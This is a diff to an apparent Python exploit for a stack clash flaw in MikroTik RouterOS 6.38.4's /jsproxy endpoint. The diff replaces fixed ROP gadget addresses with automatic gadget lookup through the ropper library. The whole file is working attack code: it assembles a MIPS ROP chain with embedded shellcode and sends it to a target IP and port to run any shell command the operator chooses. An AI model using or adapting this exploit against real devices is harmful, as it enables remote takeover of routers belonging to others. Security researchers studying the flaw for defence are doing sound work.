@@ -5,11 +5,13 @@
 # Tested on RouterOS 6.38.4 (mipsbe) [using a CRS109]
 
 # Used tools: pwndbg, rasm2, mipsrop for IDA
+# I used ropper only to automatically find gadgets
 
 # ASLR enabled on libs only
 # DEP NOT enabled
 
-import socket, time, sys, struct
+import socket, time, sys, struct, re
+from ropper import RopperService
 
 AST_STACKSIZE = 0x20000 # stack size per thread (128 KB)
 SKIP_SPACE    =  0x1000 # 4 KB of "safe" space for the stack of thread 2
@@ -17,6 +19,41 @@ ROP_SPACE     =  0x8000 # we can send 32 KB of ROP chain!
 
 ALIGN_SIZE    = 0x10 # alloca align memory with "content-length + 0x10 & 0xF" so we need to take it into account
 ADDRESS_SIZE  =  0x4 # we need to overwrite a return address to start the ROP chain
+
+class MyRopper():
+    def __init__(self, filename):
+        self.rs = RopperService()
+        
+        self.rs.clearCache()
+        self.rs.addFile(filename)
+        self.rs.loadGadgetsFor()
+        
+        self.rs.options.inst_count = 10
+        self.rs.loadGadgetsFor()
+
+    def get_gadgets(self, regex):
+        gadgets = []
+        for f, g in self.rs.search(search=regex):
+            gadgets.append(g)
+
+        if len(gadgets) > 0:
+            return gadgets
+        else:
+            raise Exception("Cannot find gadgets!")
+
+    @staticmethod
+    def get_ra_offset(gadget):
+        """
+            Return the offset of next Retun Address on the stack
+            So you know how many bytes to put before next gadget address
+            Eg: 
+                lw $ra, 0xAB ($sp)   --> return: 0xAB
+        """
+        for line in gadget.lines:
+            offset_len = re.findall("lw \$ra, (0x[0-9a-f]+)\(\$sp\)", line[1])
+            if offset_len:
+                return int(offset_len[0], 16)
+        raise Exception("Cannot find $ra offset in this gadget!")
 
 def makeHeader(num):
     return b"POST /jsproxy HTTP/1.1\r\nContent-Length: " + bytes(str(num), 'ascii') + b"\r\n\r\n"
@@ -76,30 +113,61 @@ def build_shellcode(shellCmd):
 
     return shell_code
 
-def build_payload(shellCmd):
+def build_payload(binary, shellCmd):
     ropChain = b''
     shell_code = build_shellcode(shellCmd)
+    binRop = MyRopper(binary)
     
     # 1) Stack finder gadget (to make stack pivot) 
-    ropChain += struct.pack('>L', 0x0040AE04)
+    stack_finder = binRop.get_gadgets("addiu ?a0, ?sp, 0x18; lw ?ra, 0x???(?sp% jr ?ra;")[0]
+    """
+    0x0040ae04:                     (ROS 6.38.4)
+        addiu $a0, $sp, 0x18   <--- needed action
+        lw $ra, 0x5fc($sp)     <--- jump control   [0x5fc, a lot of space for the shellcode!]
+        lw $s3, 0x5f8($sp)
+        lw $s2, 0x5f4($sp)
+        lw $s1, 0x5f0($sp)
+        lw $s0, 0x5ec($sp)
+        move $v0, $zero
+        jr $ra
+    """
+    ropChain += struct.pack('>L', stack_finder.address)
     #                                            Action: addiu  $a0, $sp, 0x600 + var_5E8                      # a0 = stackpointer + 0x18
     #                                            Control Jump:  jr    0x600 + var_4($sp) 
     # This gadget (moreover) allows us to reserve 1512 bytes inside the rop chain 
     # to store the shellcode (beacuse of: jr 0x600 + var_4($sp))
     ropChain += b'B' * 0x18  # 0x600 - 0x5E8 = 0x18           (in the last 16 bytes of this offset the shell code will write the arguments for execve)
     ropChain += shell_code   # write the shell code in this "big" offset
-    ropChain += b'C' * (0x600 - 0x18 - len(shell_code) - 0x4) # offset because of this: 0x600 + var_4($sp)
+    ropChain += b'C' * (MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)) # offset because of this: 0x600 + var_4($sp)
+
 
 
     # 2) Copy a0 in v0 because of next gadget
-    ropChain += struct.pack('>L', 0x00414E58) 
+    mov_v0_a0 = binRop.get_gadgets("lw ?ra, %move ?v0, ?a0;% jr ?ra;")[0]
+    """
+    0x00414E58:                    (ROS 6.38.4)
+        lw $ra, 0x24($sp);    <--- jump control
+        lw $s2, 0x20($sp); 
+        lw $s1, 0x1c($sp); 
+        lw $s0, 0x18($sp); 
+        move $v0, $a0;        <--- needed action
+        jr $ra;
+    """
+    ropChain += struct.pack('>L', mov_v0_a0.address) 
     #                                           Gadget Action:   move $v0, $a0                                 # v0 = a0
     #                                           Gadget Control:  jr  0x28 + var_4($sp) 
-    ropChain += b'D' * (0x28 - 0x4) # offset because of this: 0x28 + var_4($sp) 
+    ropChain += b'D' * MyRopper.get_ra_offset(mov_v0_a0) # offset because of this: 0x28 + var_4($sp) 
+
 
 
     # 3) Jump to the stack (start shell code)
-    ropChain += struct.pack('>L', 0x00412540)
+    jump_v0 = binRop.get_gadgets("move ?t9, ?v0; jalr ?t9;")[0]
+    """
+    0x00412540:                   (ROS 6.38.4)
+        move $t9, $v0;       <--- jump control
+        jalr $t9;            <--- needed action
+    """
+    ropChain += struct.pack('>L', jump_v0.address)
     #                                           Gadget Action:   jalr $t9                                      # jump v0
     #                                           Gadget Control:  jalr  $v0    
 
@@ -139,13 +207,14 @@ def stackClash(ip, port, payload):
     print("Done!")
 
 if __name__ == "__main__":
-    if len(sys.argv) == 4:
+    if len(sys.argv) == 5:
         ip       = sys.argv[1]
         port     = int(sys.argv[2])
-        shellCmd = sys.argv[3]
+        binary   = sys.argv[3]
+        shellCmd = sys.argv[4]
 
-        payload = build_payload(shellCmd)
+        payload = build_payload(binary, shellCmd)
 
         stackClash(ip, port, payload)
     else:
-        print("Usage: " + sys.argv[0] + " IP PORT shellcommand")
+        print("Usage: " + sys.argv[0] + " IP PORT binary shellcommand")
